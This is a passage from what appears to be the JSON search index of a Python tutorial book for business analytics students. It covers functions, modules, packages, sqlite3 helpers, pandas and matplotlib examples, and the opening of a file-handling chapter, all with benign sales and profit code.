    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#conclusion-1",
    "href": "03_python_control_structures.html#conclusion-1",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.7 Conclusion",
    "text": "5.7 Conclusion\nThis deep dive tutorial covered the fundamentals of Python control structures, including conditional statements, loops, control flow tools, list comprehensions, and exception handling, with examples tailored to business analytics and information systems (BAIS). By mastering these concepts, you can write more efficient and readable Python code, handle complex logic, and manage errors effectively. Understanding and utilizing control structures is essential for any Python programmer, as they form the backbone of decision-making and iterative processes in your programs.",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html",
    "href": "04_python_functions_modules.html",
    "title": "5  Introduction to Python Functions",
    "section": "",
    "text": "5.0.1 Defining and Calling Functions\nA function in Python is defined using the def keyword, followed by the function name, parentheses, and a colon. The code block within every function starts with an indentation.",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#introduction-to-python-modules",
    "href": "04_python_functions_modules.html#introduction-to-python-modules",
    "title": "5  Introduction to Python Functions",
    "section": "5.1 Introduction to Python Modules",
    "text": "5.1 Introduction to Python Modules\nPython modules are files containing Python code that can be reused across different programs. They help in organizing code, making it more manageable, and promoting code reuse. This tutorial will introduce you to Python modules, how to create them, and how to use built-in and third-party modules with business-related examples.\n\n5.1.1 What is a Module?\nA module is simply a file containing Python definitions and statements. For instance, a file named mymodule.py is a module whose name is mymodule.\n\n\n5.1.2 Importing Modules\nYou can use the import statement to import a module and access its functions and variables.\n\n5.1.2.1 Example: Using Built-in Modules\nPython comes with a rich standard library of modules.\n\n5.1.2.1.1 Example: Using the math Module\n\nimport math\n\n# Calculate the ceiling value of a product price\nproduct_price = 123.45\nceiling_price = math.ceil(product_price)\nprint(f\"Ceiling price: ${ceiling_price}\")\n\nCeiling price: $124\n\n\n\n\n\n\n5.1.3 Creating Your Own Module\nYou can create your own modules by writing Python code in a .py file.\n\n5.1.3.1 Example: Create a Module for Financial Calculations\n\nCreate a file named financial.py:\n\n# financial.py\n\ndef calculate_gross_profit(revenue, cogs):\n    return revenue - cogs\n\ndef calculate_net_profit(gross_profit, expenses):\n    return gross_profit - expenses\n\ndef calculate_roi(profit, investment):\n    return (profit / investment) * 100\n\nUse the financial.py module in another Python script:\n\n\n# main.py\nimport financial\n\nrevenue = 100000\ncogs = 40000\nexpenses = 30000\ninvestment = 50000\n\ngross_profit = financial.calculate_gross_profit(revenue, cogs)\nnet_profit = financial.calculate_net_profit(gross_profit, expenses)\nroi = financial.calculate_roi(net_profit, investment)\n\nprint(f\"Gross Profit: ${gross_profit}\")\nprint(f\"Net Profit: ${net_profit}\")\nprint(f\"Return on Investment: {roi}%\")\n\nGross Profit: $60000\nNet Profit: $30000\nReturn on Investment: 60.0%\n\n\n\n\n\n5.1.4 Using the from Import Statement\nYou can import specific functions or variables from a module using the from statement.\n\n5.1.4.1 Example: Import Specific Functions\n\nfrom financial import calculate_gross_profit, calculate_net_profit\n\nrevenue = 80000\ncogs = 30000\nexpenses = 20000\n\ngross_profit = calculate_gross_profit(revenue, cogs)\nnet_profit = calculate_net_profit(gross_profit, expenses)\n\nprint(f\"Gross Profit: ${gross_profit}\")\nprint(f\"Net Profit: ${net_profit}\")\n\nGross Profit: $50000\nNet Profit: $30000\n\n\n\n\n\n5.1.5 Using Aliases\nYou can use aliases to give a module or a function a different name.\n\n5.1.5.1 Example: Using Aliases for Modules\n\nimport financial as fin\n\nrevenue = 120000\ncogs = 50000\nexpenses = 40000\n\ngross_profit = fin.calculate_gross_profit(revenue, cogs)\nnet_profit = fin.calculate_net_profit(gross_profit, expenses)\n\nprint(f\"Gross Profit: ${gross_profit}\")\nprint(f\"Net Profit: ${net_profit}\")\n\nGross Profit: $70000\nNet Profit: $30000\n\n\n\n\n\n5.1.6 Exploring Built-in Modules\nPython’s standard library includes many modules that can be very useful in business applications.\n\n5.1.6.1 Example: Using the datetime Module\nThe datetime module is useful for manipulating dates and times.\n\nimport datetime\n\n# Calculate the number of days between two dates\ndate_format = \"%Y-%m-%d\"\nstart_date = datetime.datetime.strptime(\"2024-01-01\", date_format)\nend_date = datetime.datetime.strptime(\"2024-12-31\", date_format)\ndelta = end_date - start_date\n\nprint(f\"Number of days between the dates: {delta.days}\")\n\nNumber of days between the dates: 365\n\n\n\n\n\n5.1.7 Installing and Using Third-Party Modules\nYou can install third-party modules using pip, Python’s package installer.\n\n5.1.7.1 Example: Using the pandas Module\npandas is a popular data manipulation library useful for business data analysis.\n\nInstall pandas:\n\npip install pandas\n\nUse pandas in your Python script:\n\n\nimport pandas as pd\n\n# Create a DataFrame with sales data\ndata = {\n    \"Product\": [\"A\", \"B\", \"C\"],\n    \"Sales\": [1000, 1500, 800]\n}\n\ndf = pd.DataFrame(data)\nprint(df)\n\n# Calculate total sales\ntotal_sales = df[\"Sales\"].sum()\nprint(f\"Total Sales: ${total_sales}\")\n\n  Product  Sales\n0       A   1000\n1       B   1500\n2       C    800\nTotal Sales: $3300\n\n\n\n\n\n5.1.8 Conclusion\nPython modules are powerful tools for organizing and reusing code. By understanding how to create, import, and use both built-in and third-party modules, you can enhance the functionality and efficiency of your business applications. These examples demonstrate the practical use of modules in various business scenarios, helping you to develop robust and maintainable Python programs.",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#table-of-contents",
    "href": "04_python_functions_modules.html#table-of-contents",
    "title": "5  Introduction to Python Functions",
    "section": "6.1 Table of Contents",
    "text": "6.1 Table of Contents\n\nDefining Functions\nCalling Functions\nFunction Arguments\n\nPositional Arguments\nKeyword Arguments\nDefault Arguments\nVariable-length Arguments\n\nReturn Statement\nLambda Functions\nHigher-Order Functions\nDocstrings\nDecorators\nScope and Lifetime of Variables\nPractical Examples in BAIS\n\nSales Analysis Function\nData Cleaning Function\nDatabase Query Function\n\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#defining-functions",
    "href": "04_python_functions_modules.html#defining-functions",
    "title": "5  Introduction to Python Functions",
    "section": "6.2 Defining Functions",
    "text": "6.2 Defining Functions\nFunctions in Python are defined using the def keyword, followed by the function name, parentheses, and a colon. The body of the function is indented.\nExample: Simple Function\n\ndef greet():\n    print(\"Hello, welcome to the BAIS tutorial!\")",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#calling-functions",
    "href": "04_python_functions_modules.html#calling-functions",
    "title": "5  Introduction to Python Functions",
    "section": "6.3 Calling Functions",
    "text": "6.3 Calling Functions\nTo execute a function, you need to call it by its name followed by parentheses.\nExample: Calling a Function\n\ngreet()\n\nHello, welcome to the BAIS tutorial!\n\n\nOutput:\nHello, welcome to the BAIS tutorial!",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#function-arguments",
    "href": "04_python_functions_modules.html#function-arguments",
    "title": "5  Introduction to Python Functions",
    "section": "6.4 Function Arguments",
    "text": "6.4 Function Arguments\nFunctions can accept arguments to process data and return results.\n\n6.4.1 Positional Arguments\nPositional arguments are the most common way to pass values to a function. The order of arguments matters.\nExample: Function with Positional Arguments\n\ndef calculate_profit(revenue, expenses):\n    profit = revenue - expenses\n    return profit\n\n# Calling the function with positional arguments\nprofit = calculate_profit(100000, 50000)\nprint(f\"Profit: {profit}\")\n\nProfit: 50000\n\n\nOutput:\nProfit: 50000\n\n\n6.4.2 Keyword Arguments\nKeyword arguments allow you to specify arguments by their parameter name, making the function call more readable.\nExample: Function with Keyword Arguments\n\n# Calling the function with keyword arguments\nprofit = calculate_profit(expenses=50000, revenue=100000)\nprint(f\"Profit: {profit}\")\n\nProfit: 50000\n\n\n\n\n6.4.3 Default Arguments\nDefault arguments allow you to specify default values for parameters. If no value is provided, the default is used.\nExample: Function with Default Arguments\n\ndef calculate_profit(revenue, expenses=40000):\n    profit = revenue - expenses\n    return profit\n\n# Calling the function with and without the default argument\nprint(calculate_profit(100000))  # Uses default expenses\nprint(calculate_profit(100000, 50000))  # Overrides default expenses\n\n60000\n50000\n\n\nOutput:\n60000\n50000\n\n\n6.4.4 Variable-length Arguments\nVariable-length arguments allow you to pass a variable number of arguments to a function using *args for non-keyword arguments and **kwargs for keyword arguments.\nExample: Function with Variable-length Arguments\n\ndef print_sales(*args, **kwargs):\n    for sale in args:\n        print(f\"Sale: {sale}\")\n    for key, value in kwargs.items():\n        print(f\"{key}: {value}\")\n\n# Calling the function with variable-length arguments\nprint_sales(1000, 2000, 3000, region=\"North\", manager=\"Alice\")\n\nSale: 1000\nSale: 2000\nSale: 3000\nregion: North\nmanager: Alice\n\n\nOutput:\nSale: 1000\nSale: 2000\nSale: 3000\nregion: North\nmanager: Alice",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#return-statement",
    "href": "04_python_functions_modules.html#return-statement",
    "title": "5  Introduction to Python Functions",
    "section": "6.5 Return Statement",
    "text": "6.5 Return Statement\nThe return statement is used to send a result back to the caller. A function can return multiple values as a tuple.\nExample: Function with Return Statement\n\ndef analyze_sales(sales):\n    total_sales = sum(sales)\n    average_sales = total_sales / len(sales)\n    return total_sales, average_sales\n\n# Calling the function and unpacking the returned tuple\ntotal, average = analyze_sales([1000, 2000, 3000, 4000, 5000])\nprint(f\"Total Sales: {total}, Average Sales: {average}\")\n\nTotal Sales: 15000, Average Sales: 3000.0\n\n\nOutput:\nTotal Sales: 15000, Average Sales: 3000.0",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#lambda-functions-1",
    "href": "04_python_functions_modules.html#lambda-functions-1",
    "title": "5  Introduction to Python Functions",
    "section": "6.6 Lambda Functions",
    "text": "6.6 Lambda Functions\nLambda functions are small anonymous functions defined using the lambda keyword. They are often used for short, simple operations.\nExample: Lambda Function for Sales Tax Calculation\n\n# Lambda function to calculate sales tax\ncalculate_tax = lambda price, tax_rate: price * tax_rate\nprint(calculate_tax(100, 0.05))\n\n5.0\n\n\nOutput:\n5.0",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#higher-order-functions",
    "href": "04_python_functions_modules.html#higher-order-functions",
    "title": "5  Introduction to Python Functions",
    "section": "6.7 Higher-Order Functions",
    "text": "6.7 Higher-Order Functions\nHigher-order functions are functions that take other functions as arguments or return them as results.\nExample: Higher-Order Function for Applying Discounts\n\ndef apply_discount(price, discount_function):\n    return discount_function(price)\n\n# Regular function to calculate a discount\ndef ten_percent_discount(price):\n    return price * 0.9\n\n# Using the higher-order function\nprint(apply_discount(100, ten_percent_discount))\n\n90.0\n\n\nOutput:\n90.0",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#docstrings",
    "href": "04_python_functions_modules.html#docstrings",
    "title": "5  Introduction to Python Functions",
    "section": "6.8 Docstrings",
    "text": "6.8 Docstrings\nDocstrings provide a convenient way of associating documentation with Python modules, functions, classes, and methods.\nExample: Function with Docstring\n\ndef analyze_sales(sales):\n    \"\"\"\n    Calculate the total and average sales.\n\n    Parameters:\n    sales (list): A list of sales amounts\n\n    Returns:\n    tuple: Total and average sales\n    \"\"\"\n    total_sales = sum(sales)\n    average_sales = total_sales / len(sales)\n    return total_sales, average_sales",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#decorators",
    "href": "04_python_functions_modules.html#decorators",
    "title": "5  Introduction to Python Functions",
    "section": "6.9 Decorators",
    "text": "6.9 Decorators\nDecorators are a powerful and flexible way to extend the behavior of functions or methods without modifying their actual code. A decorator is a function that wraps another function.\nExample: Logging Decorator\n\ndef log_function_call(func):\n    def wrapper(*args, **kwargs):\n        print(f\"Calling function {func.__name__}\")\n        result = func(*args, **kwargs)\n        print(f\"Function {func.__name__} returned {result}\")\n        return result\n    return wrapper\n\n@log_function_call\ndef calculate_profit(revenue, expenses):\n    return revenue - expenses\n\n# Using the decorated function\nprint(calculate_profit(100000, 50000))\n\nCalling function calculate_profit\nFunction calculate_profit returned 50000\n50000\n\n\nOutput:\nCalling function calculate_profit\nFunction calculate_profit returned 50000\n50000",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#scope-and-lifetime-of-variables",
    "href": "04_python_functions_modules.html#scope-and-lifetime-of-variables",
    "title": "5  Introduction to Python Functions",
    "section": "6.10 Scope and Lifetime of Variables",
    "text": "6.10 Scope and Lifetime of Variables\nVariables defined inside a function are local to that function and cannot be accessed from outside. The lifetime of these variables is confined to the function’s execution.\nExample: Variable Scope\n\ndef analyze_sales(sales):\n    total_sales = sum(sales)\n    return total_sales\n\n# total_sales is not accessible outside the function\ntotal = analyze_sales([1000, 2000, 3000])\nprint(total)\n\n6000\n\n\nOutput:\n6000",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#practical-examples-in-bais",
    "href": "04_python_functions_modules.html#practical-examples-in-bais",
    "title": "5  Introduction to Python Functions",
    "section": "6.11 Practical Examples in BAIS",
    "text": "6.11 Practical Examples in BAIS\n\n6.11.1 Sales Analysis Function\nExample: Calculate Sales Metrics\n\ndef calculate_sales_metrics(sales):\n    \"\"\"\n    Calculate total, average, and highest sales.\n\n    Parameters:\n    sales (list): A list of sales amounts\n\n    Returns:\n    dict: A dictionary with total, average, and highest sales\n    \"\"\"\n    total_sales = sum(sales)\n    average_sales = total_sales / len(sales)\n    highest_sale = max(sales)\n    return {\n        \"total_sales\": total_sales,\n        \"average_sales\": average_sales,\n        \"highest_sale\": highest_sale\n    }\n\n# Example usage\nsales_data = [1000, 2000, 3000, 4000, 5000]\nmetrics = calculate_sales_metrics(sales_data)\nprint(metrics)\n\n{'total_sales': 15000, 'average_sales': 3000.0, 'highest_sale': 5000}\n\n\nOutput:\n{'total_sales': 15000, 'average_sales': 3000.0, 'highest_sale': 5000}\n\n\n6.11.2 Data Cleaning Function\nExample: Remove Outliers from Sales Data\n\ndef remove_outliers(data, threshold=2):\n    \"\"\"\n    Remove outliers from the data.\n\n    Parameters:\n    data (list): A list of numerical values\n    threshold (int): The number of standard deviations to use as the cutoff\n\n    Returns:\n    list: A list with outliers removed\n    \"\"\"\n    import numpy as np\n    mean = np.mean(data)\n    std_dev = np.std(data)\n    filtered_data = [x for x in data if (mean - threshold * std_dev &lt; x &lt; mean + threshold * std_dev)]\n    return filtered_data\n\n# Example usage\nsales_data = [1000, 2000, 3000, 4000, 5000, 100000]\ncleaned_data = remove_outliers(sales_data)\nprint(cleaned_data)\n\n[1000, 2000, 3000, 4000, 5000]\n\n\nOutput:\n[1000, 2000, 3000, 4000, 5000]\n\n\n6.11.3 Database Query Function\nExample: Query Sales Data from Database\n\nimport sqlite3\n\ndef query_sales_data(db_name):\n    \"\"\"\n    Query sales data from the database.\n\n    Parameters:\n    db_name\n\n (str): The name of the database file\n\n    Returns:\n    list: A list of sales records\n    \"\"\"\n    connection = sqlite3.connect(db_name)\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT * FROM sales\")\n    sales_data = cursor.fetchall()\n    connection.close()\n    return sales_data\n\n# Example usage\n# Make sure to have a database file named 'sales_example.db' with a 'sales' table\nsales_data = query_sales_data('sales_example.db')\nprint(sales_data)\n\n[(1, 100, 'North'), (2, 200, 'South'), (3, 150, 'East'), (4, 300, 'West'), (5, 250, 'North')]",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#conclusion-2",
    "href": "04_python_functions_modules.html#conclusion-2",
    "title": "5  Introduction to Python Functions",
    "section": "6.12 Conclusion",
    "text": "6.12 Conclusion\nThis deep dive tutorial covered the fundamentals and advanced features of Python functions, with practical examples in business analytics and information systems (BAIS). Understanding how to define, call, and utilize functions effectively is essential for writing modular, readable, and maintainable code. Functions are a powerful tool that allows you to encapsulate logic, improve code reuse, and manage complexity in your Python programs.",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#table-of-contents-1",
    "href": "04_python_functions_modules.html#table-of-contents-1",
    "title": "5  Introduction to Python Functions",
    "section": "7.1 Table of Contents",
    "text": "7.1 Table of Contents\n\nWhat is a Python Module?\nCreating a Module\nImporting a Module\nThe __name__ Variable\nCreating a Package\nImporting from a Package\nUsing __init__.py\nPractical Examples in BAIS\n\nData Analysis Module\nData Visualization Module\nDatabase Interaction Module\n\nBest Practices for Using Modules\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#what-is-a-python-module",
    "href": "04_python_functions_modules.html#what-is-a-python-module",
    "title": "5  Introduction to Python Functions",
    "section": "7.2 What is a Python Module?",
    "text": "7.2 What is a Python Module?\nA Python module is a file containing Python definitions and statements. Modules can define functions, classes, and variables. They can also include runnable code. Grouping related code into a module makes the code easier to understand and use.",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#creating-a-module",
    "href": "04_python_functions_modules.html#creating-a-module",
    "title": "5  Introduction to Python Functions",
    "section": "7.3 Creating a Module",
    "text": "7.3 Creating a Module\nCreating a module in Python is simple. Just save your code in a .py file.\nExample 1: math_operations.py\n# math_operations.py    \ndef add(a, b):\n    return a + b\n\ndef subtract(a, b):\n    return a - b\n\ndef multiply(a, b):\n    return a * b\n\ndef divide(a, b):\n    if b == 0:\n        raise ValueError(\"Cannot divide by zero.\")\n    return a / b\nExample 2: string_operations.py\n#string_operations.py\ndef uppercase(text):\n    return text.upper()\n\ndef lowercase(text):\n    return text.lower()",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#importing-a-module",
    "href": "04_python_functions_modules.html#importing-a-module",
    "title": "5  Introduction to Python Functions",
    "section": "7.4 Importing a Module",
    "text": "7.4 Importing a Module\nTo use the functions and variables in a module, you need to import the module into your script.\nExample: Importing math_operations.py\n\nimport math_operations\n\nprint(math_operations.add(10, 5))\nprint(math_operations.subtract(10, 5))\nprint(math_operations.multiply(10, 5))\nprint(math_operations.divide(10, 5))\n\n15\n5\n50\n2.0\n\n\nYou can also import specific functions or variables from a module.\n\nfrom math_operations import add, subtract\n\nprint(add(10, 5))\nprint(subtract(10, 5))\n\n15\n5",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#the-__name__-variable",
    "href": "04_python_functions_modules.html#the-__name__-variable",
    "title": "5  Introduction to Python Functions",
    "section": "7.5 The __name__ Variable",
    "text": "7.5 The __name__ Variable\nThe __name__ variable is a special built-in variable in Python. It gets its value depending on how the script is executed. If the script is run directly, __name__ is set to \"__main__\". If the script is imported as a module, __name__ is set to the module’s name.\nExample: Using __name__\n# save as my_module.py\ndef main():\n    print(\"This is the main function.\")\n\nif __name__ == \"__main__\":\n    main()\nExample: Importing my_module.py\n\nimport my_module\n\n# This will not print \"This is the main function.\" because __name__ is not \"__main__\"",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#creating-a-package",
    "href": "04_python_functions_modules.html#creating-a-package",
    "title": "5  Introduction to Python Functions",
    "section": "7.6 Creating a Package",
    "text": "7.6 Creating a Package\nA package is a way of organizing related modules into a directory hierarchy. A package is simply a directory containing an __init__.py file and one or more module files.\nExample: Directory Structure\nmy_package/\n    __init__.py\n    math_operations.py\n    string_operations.py",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#importing-from-a-package",
    "href": "04_python_functions_modules.html#importing-from-a-package",
    "title": "5  Introduction to Python Functions",
    "section": "7.7 Importing from a Package",
    "text": "7.7 Importing from a Package\nYou can import modules from a package using the import statement.\nExample: Importing from a Package\n\nfrom my_package import math_operations\n\nprint(math_operations.add(10, 5))\n\n15",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#using-__init__.py",
    "href": "04_python_functions_modules.html#using-__init__.py",
    "title": "5  Introduction to Python Functions",
    "section": "7.8 Using __init__.py",
    "text": "7.8 Using __init__.py\nThe __init__.py file is used to initialize a Python package. It can be empty or contain initialization code for the package.\nExample: __init__.py\n# This file can be empty or contain initialization code\nExample: Using __init__.py to Simplify Imports\n# my_package/__init__.py\nfrom .math_operations import add, subtract, multiply, divide\nfrom .string_operations import uppercase, lowercase\nNow you can import directly from my_package:\n\nfrom my_package import add, uppercase\n\nprint(add(10, 5))\nprint(uppercase(\"hello\"))\n\n15\nHELLO",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#practical-examples-in-bais-1",
    "href": "04_python_functions_modules.html#practical-examples-in-bais-1",
    "title": "5  Introduction to Python Functions",
    "section": "7.9 Practical Examples in BAIS",
    "text": "7.9 Practical Examples in BAIS\n\n7.9.1 Data Analysis Module\nExample: data_analysis.py\nimport pandas as pd\n\ndef calculate_statistics(data):\n    return {\n        \"mean\": data.mean(),\n        \"median\": data.median(),\n        \"std_dev\": data.std()\n    }\n\ndef filter_data(data, column, value):\n    return data[data[column] == value]\nUsage:\n\nimport data_analysis as da\n\ndata = pd.DataFrame({\n    \"sales\": [100, 200, 150, 300, 250],\n    \"region\": [\"North\", \"South\", \"East\", \"West\", \"North\"]\n})\n\nstats = da.calculate_statistics(data[\"sales\"])\nprint(stats)\n\nfiltered_data = da.filter_data(data, \"region\", \"North\")\nprint(filtered_data)\n\n{'mean': np.float64(200.0), 'median': np.float64(200.0), 'std_dev': np.float64(79.05694150420949)}\n   sales region\n0    100  North\n4    250  North\n\n\n\n\n7.9.2 Data Visualization Module\nExample: data_visualization.py\nimport matplotlib.pyplot as plt\n\ndef plot_sales(data):\n    plt.plot(data)\n    plt.title(\"Sales Over Time\")\n    plt.xlabel(\"Time\")\n    plt.ylabel(\"Sales\")\n    plt.show()\n\ndef plot_bar_chart(data, labels):\n    plt.bar(labels, data)\n    plt.title(\"Sales by Region\")\n    plt.xlabel(\"Region\")\n    plt.ylabel(\"Sales\")\n    plt.show()\nUsage:\n\nimport data_visualization as dv\n\nsales_data = [100, 200, 150, 300, 250]\nregions = [\"North\", \"South\", \"East\", \"West\", \"North\"]\n\ndv.plot_sales(sales_data)\ndv.plot_bar_chart(sales_data, regions)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n7.9.3 Database Interaction Module\nExample: database_interaction.py\nimport sqlite3\n\ndef create_connection(db_file):\n    conn = sqlite3.connect(db_file)\n    return conn\n\ndef create_table(conn, create_table_sql):\n    cursor = conn.cursor()\n    cursor.execute(create_table_sql)\n    conn.commit()\n\ndef insert_data(conn, table, data):\n    placeholders = \", \".join(\"?\" * len(data))\n    sql = f\"INSERT INTO {table} VALUES ({placeholders})\"\n    cursor = conn.cursor()\n    cursor.execute(sql, data)\n    conn.commit()\n\ndef query_data(conn, query):\n    cursor = conn.cursor()\n    cursor.execute(query)\n    return cursor.fetchall()\nUsage:\n\nimport database_interaction as db\n\nconn = db.create_connection(\"sales.db\")\n\ncreate_sales_table = \"\"\"\nCREATE TABLE IF NOT EXISTS sales (\n    id INTEGER PRIMARY KEY,\n    region TEXT,\n    amount INTEGER\n)\n\"\"\"\ndb.create_table(conn, create_sales_table)\n\ndb.insert_data(conn, \"sales\", (1, \"North\", 100))\ndb.insert_data(conn, \"sales\", (2, \"South\", 200))\n\nresults = db.query_data(conn, \"SELECT * FROM sales\")\nfor row in results:\n    print(row)\n\nconn.close()\n\n(1, 'North', 100)\n(2, 'South', 200)",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#best-practices-for-using-modules",
    "href": "04_python_functions_modules.html#best-practices-for-using-modules",
    "title": "5  Introduction to Python Functions",
    "section": "7.10 Best Practices for Using Modules",
    "text": "7.10 Best Practices for Using Modules\n\nModularity: Break your code into smaller, reusable modules.\nNaming Conventions: Use meaningful names for modules and functions.\nDocumentation: Include docstrings to document your functions and modules.\nAvoiding Circular Imports: Be mindful of dependencies between modules to avoid circular imports.\nTesting: Write tests for your modules to ensure they work as expected.\nVersion Control: Use version control (e.g., Git) to manage changes to your modules.",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "04_python_functions_modules.html#conclusion-3",
    "href": "04_python_functions_modules.html#conclusion-3",
    "title": "5  Introduction to Python Functions",
    "section": "7.11 Conclusion",
    "text": "7.11 Conclusion\nThis deep dive tutorial covered the fundamentals and advanced features of Python modules, with practical examples in business analytics and information systems (BAIS). Understanding how to create, import, and use modules effectively is essential for writing modular, readable, and maintainable code. Modules allow you to encapsulate logic, improve code reuse, and manage complexity in your Python programs.",
    "crumbs": [
      "<span class='chapter-number'>5</span>  <span class='chapter-title'>Introduction to Python Functions</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html",
    "href": "05_python_data_handling_file_io.html",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "",
    "text": "6.0.1 Reading and Writing Text Files\nText files are the most basic form of file handling in Python. You can use built-in functions to read from and write to text files.",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#table-of-contents",
    "href": "05_python_data_handling_file_io.html#table-of-contents",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.1 Table of Contents",
    "text": "7.1 Table of Contents\n\nIntroduction to File I/O\nReading and Writing Text Files\nReading and Writing CSV Files\nReading and Writing Excel Files\nHandling JSON Data\nDatabase Interaction\nWorking with Large Data Sets\nPractical Examples in BAIS\n\nSales Data Analysis\nCustomer Data Management\n\nBest Practices for Data Handling and File I/O\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#introduction-to-file-io",
    "href": "05_python_data_handling_file_io.html#introduction-to-file-io",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.2 Introduction to File I/O",
    "text": "7.2 Introduction to File I/O\nFile I/O in Python involves reading from and writing to files. Python provides built-in functions for file operations, making it easy to handle various file types such as text, CSV, Excel, and JSON.",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#reading-and-writing-text-files-1",
    "href": "05_python_data_handling_file_io.html#reading-and-writing-text-files-1",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.3 Reading and Writing Text Files",
    "text": "7.3 Reading and Writing Text Files\nText files are the simplest form of file I/O in Python.\n\n7.3.1 Reading Text Files\n\n# Read entire file\nwith open('data.txt', 'r') as file:\n    data = file.read()\n    print(data)\n\n# Read file line by line\nwith open('data.txt', 'r') as file:\n    for line in file:\n        print(line.strip())\n\n70\n55\n2\n73\n57\n76\n87\n21\n3\n83\n70\n55\n2\n73\n57\n76\n87\n21\n3\n83\n\n\n\n\n7.3.2 Writing Text Files\n\n# Write to a file\nwith open('output.txt', 'w') as file:\n    file.write('This is a line of text.\\n')\n\n# Append to a file\nwith open('output.txt', 'a') as file:\n    file.write('This is another line of text.\\n')",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#reading-and-writing-csv-files",
    "href": "05_python_data_handling_file_io.html#reading-and-writing-csv-files",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.4 Reading and Writing CSV Files",
